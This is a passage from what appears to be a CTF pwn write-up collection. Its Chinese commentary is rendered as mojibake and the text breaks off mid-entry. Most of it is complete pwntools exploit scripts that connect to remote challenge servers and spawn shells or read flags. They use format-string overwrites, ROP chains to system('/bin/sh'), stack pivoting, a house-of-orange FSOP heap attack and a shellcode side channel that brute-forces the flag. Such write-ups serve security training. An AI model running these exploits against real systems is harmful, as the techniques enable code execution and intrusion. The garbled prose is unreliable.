&lt;code&gt;save_text&lt;/code&gt;å°†ç”¨æˆ·åˆšæ‰è¾“å…¥çš„å†…å®¹å†™å…¥æ ˆä¸Š&lt;br&gt;
&lt;code&gt;show_error&lt;/code&gt; å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ‰“å°è·ç¦»textä¸€æ®µå›ºå®šåç§»å¤„(0x100)çš„å€¼æŒ‡å‘çš„å†…å®¹&lt;br&gt;
å¯ä»¥åˆ©ç”¨ &lt;code&gt;edit_text&lt;/code&gt; å’Œ &lt;code&gt;show_error&lt;/code&gt; æ³„éœ²å‡ºlibcå’Œcanary(åè€…å…¶å®æ²¡å¿…è¦&lt;br&gt;
ä¹‹ååˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŠ«æŒ &lt;code&gt;show_error&lt;/code&gt; çš„retåœ°å€ï¼Œone_gadgetæ­¤é¢˜çˆ†ä¸äº†&lt;br&gt;
å¯ä»¥ &lt;code&gt;ret+0x8,ret+0x10,ret+0x18&lt;/code&gt; å†™ropï¼Œæœ€åä¸€æ¬¡åŠ«æŒåˆ°retä¸Šè§¦å‘ropå³å¯&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)

io=remote(&amp;quot;45.153.243.57&amp;quot;,13337)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def edit(cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;text: &amp;quot;,cc)

def save():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

def exit():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def pf():
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    
# gdb.attach(io)
# pause()

#leak libc_addr
payload=b&amp;quot;\x00&amp;quot;*0x100+b&amp;quot;\x40\x81&amp;quot;
edit(payload)
save()
pf()

sleep(1)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a780
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
pop_rsp=leak_addr+0x35732
ret=leak_addr+0xf8098
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


#leak stack_addr
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(environ)
edit(payload)
save()
pf()

sleep(1)


stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
begin_addr=stack_addr-0x238
print(&amp;quot;begin_addr: &amp;quot;,hex(begin_addr))
ret_addr=begin_addr+0x118
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
canary_addr=stack_addr-0x130
print(&amp;quot;canary_addr: &amp;quot;,hex(canary_addr))


#leak canary
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(canary_addr+1)
edit(payload)
save()
pf()

sleep(1)

canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
shell=leak_addr+0xebdb3


#fmt 1
payload=fmtstr_payload(10,{ret_addr+0x8:p64(pop_rdi)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 2
payload=fmtstr_payload(10,{ret_addr+0x10:p64(str_sh)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 3
payload=fmtstr_payload(10,{ret_addr+0x18:p64(sys_addr)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 4
payload=fmtstr_payload(10,{ret_addr:p64(ret)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()

exit()

io.interactive()
# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
# rsp &amp;amp; 0xf == 0
# rcx == NULL
# rbp == NULL || (u16)[rbp] == NULL
# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [rdx] == NULL || rdx == NULL
# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
# address rbp-0x78 is writable
# [rsi] == NULL || rsi == NULL
# [rdx] == NULL || rdx == NULL
# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [r12] == NULL || r12 == NULL
# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x50 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame_2023_lenlim-shellcode-ora&#34;&gt;0xGame_2023_lenlim-shellcode-ora&lt;/h3&gt;
&lt;p&gt;ä¾§ä¿¡é“çˆ†ç ´flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
# elf=ELF(&amp;quot;./pwn&amp;quot;)


read_shellcode=asm(&#39;&#39;&#39;
    mov edi,0
    push 0x2023000d
    pop rsi
    syscall              
&#39;&#39;&#39;)


def exp(dis,char):
    shellcode = asm(&#39;&#39;&#39;
            push   0x67616c66
            push   0x2
            pop    rax
            mov    rdi,rsp
            xor    rsi,rsi
            syscall 

            mov    rdi,rax
            xor    rax,rax
            mov    rsi,0x20230300
            push   0x50
            pop    rdx
            syscall 
            
            mov dl, byte ptr [rsi+{}]
            mov cl, {}
            cmp cl,dl
            jz loop
            mov al,60
            syscall
            loop:
            jmp loop
            &#39;&#39;&#39;.format(dis,char))
    io.send(shellcode)
flag = &amp;quot;0xGame{N0_SHELLCODE_NEXT_TIME_PLZ&amp;quot;

for i in range(len(flag),50):
    sleep(1)
    log.success(&amp;quot;flag : {}&amp;quot;.format(flag))
    for j in range(0x20,0x80):
        # io = process(&#39;./pwn&#39;)
        io=remote(&amp;quot;8.130.35.16&amp;quot;,54000)
        try:
            payload=read_shellcode
            io.sendafter(b&amp;quot;code:\n&amp;quot;,payload)
            io.recvuntil(b&amp;quot;machanism...\n&amp;quot;)
            exp(i,j)
            io.recvline(timeout=1)
            flag += chr(j)
            io.send(&#39;\n&#39;)
            log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
            io.close()
            break
        except:           
            io.close()


# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar2023_week5_no_output&#34;&gt;newstar2023_week5_no_output:&lt;/h3&gt;
&lt;p&gt;æ·€ç²‰æå®¢linkmapå¼±åŒ–ç‰ˆï¼Œlinkmapé‚£é“å¾—è‡ªå·±æ‰¾gadgetï¼Œè¿™é“é¢˜ç›´æ¥æŠŠlibcåœ°å€å†™bssæ®µä¸Šäº†ï¼Œç›´æ¥&lt;code&gt;partial write&lt;/code&gt;æ”¹writeï¼Œæå‰å¸ƒç½®å¥½å¯„å­˜å™¨é¡ºå¸¦æ ˆè¿ç§»è¿‡å»æ³„éœ²å°±å¯ä»¥äº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27515)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401253
pop_rsi_r15=0x401251
pop_rbp=0x40112d
a_addr=0x404050
bss_addr=0x404800
read_text=0x4011c1
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
leave_ret=0x4011ea


# gdb.attach(io)
# pause()

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr+8)*2+p64(read_plt)
io.send(payload)

sleep(0.5)

payload=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr+0x400)*2+p64(read_plt)+p64(pop_rbp)+p64(bss_addr+0x400-0x8)+p64(leave_ret)
io.send(payload)

sleep(0.5)

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr)*2+p64(read_plt)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+p64(pop_rdi)+p64(1)+p64(pop_rbp)+p64(0x404050-0x8)+p64(leave_ret)
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\x60\x30&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.send(payload)



io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011ea : leave ; ret
# 0x000000000040124c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401250 : pop r14 ; pop r15 ; ret
# 0x0000000000401252 : pop r15 ; ret
# 0x000000000040124b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040112d : pop rbp ; ret
# 0x0000000000401253 : pop rdi ; ret
# 0x0000000000401251 : pop rsi ; pop r15 ; ret
# 0x000000000040124d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar_week5_planet&#34;&gt;newstar_week5_planet:&lt;/h3&gt;
&lt;p&gt;è¿™é“é¢˜æœ‰å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œçš„åé—¨å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡éªŒè¯æ‰èƒ½è¿›å…¥&lt;br&gt;
è¿™é‡Œæˆ‘ä»¬ç›´æ¥æŠŠéªŒè¯é‡Œé¢ç”Ÿæˆéšæœºå­—ç¬¦ä¸²æ‰€å¼•ç”¨çš„é‚£ä¸€ä¸²asciiå­—ç¬¦è¡¨å…¨éƒ¨è¦†ç›–ä¸º1å³å¯&lt;br&gt;
æœ¬æ¥week5è¿˜æœ‰ä¸€é“pinç ä¾§ä¿¡é“çš„ï¼Œå°±æ˜¯ä»Šå¹´å›½èµ›lojinçš„å¼±åŒ–ç‰ˆï¼Œç½‘ä¸Šä¸€æœå°±æœ‰è„šæœ¬çš„ï¼Œé‚£ä¸ª8ä½è¿™ä¸ªåªæœ‰6ä½ï¼Œä½†æ˜¯ç½‘ç»œç¯å¢ƒæŒºæŠ½è±¡çš„ï¼Œéš¾ç»·ï¼Œä¸æ”¾äº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25518)
elf=ELF(&amp;quot;./pwn&amp;quot;)

def Jump():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Jump&amp;quot;)
    
def GetName():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GetName&amp;quot;)
    
def Rename(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Rename&amp;quot;)
    io.sendlineafter(b&amp;quot;name\n&amp;quot;,cc)
    
def GoBack(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GoBack&amp;quot;)
    io.sendline(cc)
    
def Check():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Check&amp;quot;)
    
def Search():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Search&amp;quot;)
    
def Nap():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Nap&amp;quot;)
    
def Admin(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Admin&amp;quot;)
    io.sendlineafter(b&amp;quot;passwd\n&amp;gt; &amp;quot;,cc)
    

psss=b&amp;quot;secret_passwd_anti_bad_guys&amp;quot;


# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Passwd: &amp;quot;,psss)

Nap()
# for i in range(11):
#     Nap()
#     Jump()

GetName()
Rename(b&amp;quot;a&amp;quot;*0x10)
GetName()

io.recvuntil(b&amp;quot;a&amp;quot;*0x10)
abcd_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x10
print(&amp;quot;abcd_addr: &amp;quot;,hex(abcd_addr))    


sleep(1)
GetName()
Rename(b&amp;quot;b&amp;quot;*0x18+p64(abcd_addr))
Jump()
GetName()
Rename(b&amp;quot;1&amp;quot;*0x21)

Admin(b&amp;quot;1&amp;quot;*0x1e)


io.sendlineafter(b&amp;quot;exec\n&amp;gt; &amp;quot;,b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_ezheap&#34;&gt;axb_ezheap:&lt;/h3&gt;
&lt;p&gt;å½“æ—¶ç›´æ¥è·³è¿‡house of orangeå»çœ‹house of apple...&lt;br&gt;
æ­¤é¢˜GLIBC 2.23 11.03ï¼Œhouse of orangeçš„æ¨¡æ¿é¢˜&lt;br&gt;
é¢˜ç›®æœ€å¼€å§‹ç»™å‡ºå †åœ°å€&lt;br&gt;
é€šè¿‡1æ¬¡addä¹‹åçš„å †æº¢å‡ºå†™ä¿®æ”¹&lt;code&gt;top chunk&lt;/code&gt;ï¼Œéœ€è¦æ³¨æ„å†…å­˜é¡µå¯¹é½ï¼Œ&lt;code&gt;prev_inuse=1&lt;/code&gt;&lt;br&gt;
å†addä¸€æ¬¡å¤§çš„ç”³è¯·å‡ºä¿®æ”¹è¿‡åçš„&lt;code&gt;old top chunk&lt;/code&gt;è¿›å…¥&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
å†é€šè¿‡addç”³è¯·åˆ°&lt;code&gt;unsorted bin&lt;/code&gt;ä»¥æ­¤æ³„éœ²libc&lt;br&gt;
ä¹‹åä¼ªé€ &lt;code&gt;IO_FILE&lt;/code&gt;ç»“æ„ä½“ï¼Œ2.23å¯ä»¥å¯¹&lt;code&gt;vtable&lt;/code&gt;æ— æ£€æŸ¥ï¼Œ&lt;code&gt;vtable&lt;/code&gt;ä¼ªé€ åˆ°å¯æ§å †åœ°å€å³å¯&lt;br&gt;
ç„¶åä¿è¯&lt;code&gt;ä¼ªé€ åˆ°çš„åœ°å€+0x18&lt;/code&gt;å¤„ä¹Ÿå¯æ§ï¼Œå³&lt;code&gt;vtable[3]&lt;/code&gt;å¯æ§ï¼Œæ­¤å¤„æ˜¯&lt;code&gt;__overflow&lt;/code&gt;ï¼Œä¿®æ”¹ä¸º&lt;code&gt;system&lt;/code&gt;åœ°å€&lt;br&gt;
ä¿®æ”¹&lt;code&gt;unsorted bin&lt;/code&gt; bkä¸º&lt;code&gt;_IO_list_all-0x10&lt;/code&gt;,åé¢&lt;code&gt;unsorted bin attack&lt;/code&gt;åå†åˆ†é…ä¸€ä¸ªå †å—ï¼Œåˆ©ç”¨&lt;code&gt;_chain&lt;/code&gt;æ ‡å¿—ä½ï¼Œæ­¤æ ‡å¿—ä½æ­£å¥½ä½äº&lt;code&gt;_IO_FILE&lt;/code&gt;ç»“æ„ä½“0x60å¤„ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªæ–‡ä»¶æµï¼Œæº¢å‡ºå†™&lt;code&gt;unsorted bin&lt;/code&gt; sizeä¸º&lt;code&gt;0x61&lt;/code&gt;ï¼Œ å±äº &lt;code&gt;smallbin&lt;/code&gt;ï¼Œè¿™ä¸ªå¤§å°çš„ &lt;code&gt;smallbin&lt;/code&gt; ç›¸å¯¹ &lt;code&gt;unsorted bin&lt;/code&gt; çš„åç§»ï¼Œä¸ &lt;code&gt;_chain&lt;/code&gt; ç›¸å¯¹ &lt;code&gt;_IO_list_all&lt;/code&gt; çš„åç§»æ˜¯ä¸€æ ·çš„,ä½¿å¾—&lt;code&gt;_IO_list_all&lt;/code&gt;æŒ‡å‘&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
è€Œä¿®æ”¹åçš„&lt;code&gt;unsorted bin&lt;/code&gt;å†æ¬¡mallocæ—¶ä¼šæŠ¥é”™ï¼Œè·¯å¾„å¦‚ä¸‹&lt;br&gt;
&lt;code&gt;malloc-&amp;gt;_int_malloc-&amp;gt;__libc_message-&amp;gt;abort-&amp;gt;_IO_flush_all_lockp&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_flush_all_lockp&lt;/code&gt;éå†æ–‡ä»¶æµï¼ŒæŠ¥é”™å¤„ç† &lt;code&gt;_chain&lt;/code&gt; æŒ‡å‘çš„ä¸‹ä¸€ä¸ªæ–‡ä»¶æµï¼Œæ‰€ä»¥åˆ©ç”¨&lt;code&gt;unsorted bin&lt;/code&gt;ä¼ªé€ &lt;code&gt;IO_FILE&lt;/code&gt;ç»“æ„ä½“&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28437)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;Name?\n&amp;quot;,cc)

def edit(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)

def show():
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;3&amp;quot;)
    
# gdb.attach(io.pid)
# pause()

heap_addr=int(io.recvline(),16)-0x10
print(&amp;quot;heap_addr:&amp;quot;,hex(heap_addr))

add(0x68,b&amp;quot;a&amp;quot;)
edit(0x6f,b&amp;quot;\x00&amp;quot;*0x68+b&amp;quot;\x71\x0f\x00&amp;quot;)

add(0xf70,b&amp;quot;a&amp;quot;)

add(0x80,b&amp;quot;a&amp;quot;*8)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c5188
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
fake_vtable=heap_addr+0x268


add(0x68,b&amp;quot;asd&amp;quot;)

padding=b&amp;quot;a&amp;quot;*0x60

fakefile=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0x61) #_flags -&amp;gt; /bin/sh
fakefile+=p64(0)+p64(_IO_list_all-0x10) #bk-&amp;gt; _IO_list_all-0x10
fakefile+=p64(0)+p64(1)
fakefile=fakefile.ljust(0xc0,b&amp;quot;\x00&amp;quot;)
fakefile+=p64(0)*3
fakefile+=p64(fake_vtable)+p64(0)*2+p64(sys_addr) # fake_vtable+0x18 (vtable[3]) -&amp;gt; &amp;amp;sys_addr

padding+=fakefile

edit(len(padding),padding)

io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)

gdb.attach(io.pid)
pause()

io.sendlineafter(&amp;quot;it\n&amp;quot;,b&amp;quot;1&amp;quot;) #local

# io.sendlineafter(&amp;quot;it\n&amp;quot;,str(0x100)) #remote

# io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;yukkurisay&#34;&gt;YukkuriSay&lt;/h3&gt;
&lt;p&gt;å¾ªç¯å†…è¾“å…¥æ³„éœ²æ ˆåœ°å€å’Œlibc&lt;br&gt;
æœ€åä¸€æ¬¡å¾ªç¯å†…å¸ƒç½®è·³æ¿&lt;br&gt;
å¾ªç¯å¤–æœ‰ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœºä¼šï¼Œå¯ä»¥åˆ©ç”¨åˆšæ‰æˆ‘ä»¬å¸ƒç½®çš„è·³æ¿ä¿®æ”¹&lt;code&gt;printf&lt;/code&gt;çš„gotè¡¨ä¸º&lt;code&gt;sys_addr&lt;/code&gt;ä»¥åŠä¿®æ”¹&lt;code&gt;ret_addr&lt;/code&gt;å†ä¸€æ¬¡è¾“å…¥&lt;code&gt;/bin/sh\x00&lt;/code&gt;æ¥&lt;code&gt;getshell&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28513)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=elf.libc


io.sendafter(b&amp;quot;say?\n&amp;quot;,cyclic(0x98))

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x23b6a 
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92
ret=leak_addr+0x142c92
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xe3b01

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
io.send(b&amp;quot;b&amp;quot;*0xff+b&amp;quot;.&amp;quot;)

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
ret_addr=stack_addr-0x8
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
payload=p64(elf.got[b&amp;quot;printf&amp;quot;])
payload+=p64(ret_addr)
payload+=p64(ret_addr+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+2)

io.send(payload)

s1=sys_addr&amp;amp;0xff
s2=(sys_addr&amp;gt;&amp;gt;8)&amp;amp;0xff
s3=(sys_addr&amp;gt;&amp;gt;16)&amp;amp;0xff
gift1=0x401678&amp;amp;0xff
gift2=(0x401678&amp;gt;&amp;gt;8)&amp;amp;0xff

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;n&amp;quot;)

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(s1,8) #å¸ƒç½®è·³æ¿åœ¨æ ˆä¸Šåç§»ä¸º8
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift1-s1,9) #é˜²æ­¢è¢«å‡æ•°å°äºå‡æ•°çš„æƒ…å†µå‘ç”Ÿ
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift2-gift1,10)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s2-gift2,11)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s3-s2,12)
io.sendafter(b&amp;quot;: \n&amp;quot;,payload)

sleep(1)

io.send(b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è¥¿æ¹–è®ºå‰‘_babycalc&#34;&gt;è¥¿æ¹–è®ºå‰‘_babycalc:&lt;/h3&gt;
&lt;p&gt;æ²¡æœ‰æº¢å‡º&lt;br&gt;
z3è§£æ–¹ç¨‹ï¼Œå°†è§£å‡ºçš„å€¼æ”¾å…¥å¯¹åº”ä½ç½®å³å¯&lt;br&gt;
é¦–å…ˆå­˜åœ¨rbpå­˜åœ¨ä¸€ä¸ª&lt;code&gt;off_by_one&lt;/code&gt;ï¼Œå¯ä»¥æ”¹å†™rbpä½1å­—èŠ‚ï¼Œä½¿å¾—rbpå¯ä»¥æŒ‡å‘æˆ‘ä»¬å¯æ§æ ˆåŒº(æ¦‚ç‡)&lt;/p&gt;
&lt;p&gt;å…¶æ¬¡å­˜åœ¨ä¸€ä¸ª&lt;code&gt;var_38[idx]=iVar1&lt;/code&gt;ï¼Œ&lt;code&gt;idx&lt;/code&gt;ä¸ºæˆ‘ä»¬å¯æ§å­—æ®µï¼Œå³å¾ªç¯çš„&lt;code&gt;i&lt;/code&gt;å€¼ï¼Œ&lt;code&gt;iVar1&lt;/code&gt;ä¹Ÿå¯æ§,æˆ‘ä»¬æœ€å¼€å§‹è¾“å…¥çš„16è¿›åˆ¶å€¼é€šè¿‡&lt;code&gt;strtol&lt;/code&gt;è½¬åŒ–ä¸º&lt;code&gt;iVar1&lt;/code&gt;&lt;br&gt;
å¯ä»¥å†™ä¸€å­—èŠ‚ä½¿retä½ä¸€å­—èŠ‚ä¸º&lt;code&gt;0x18&lt;/code&gt;ä½¿å¾—å…¶å˜ä¸º&lt;code&gt;leave; ret&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å¯æ§æ ˆåŒºæˆ‘ä»¬å¯ä»¥æ”¾å…¥å¤§é‡&lt;code&gt;ret&lt;/code&gt;å……å½“&lt;code&gt;sled&lt;/code&gt;ï¼Œç„¶åæ”¾å…¥ropé“¾ï¼Œæœ€åå°±å¯ä»¥æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„å¯æ§æ ˆåŒºæ‰§è¡Œropé“¾&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡æˆ‘ä»¬æ³„éœ²libcï¼Œç¬¬äºŒæ¬¡å°±å¯ä»¥getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
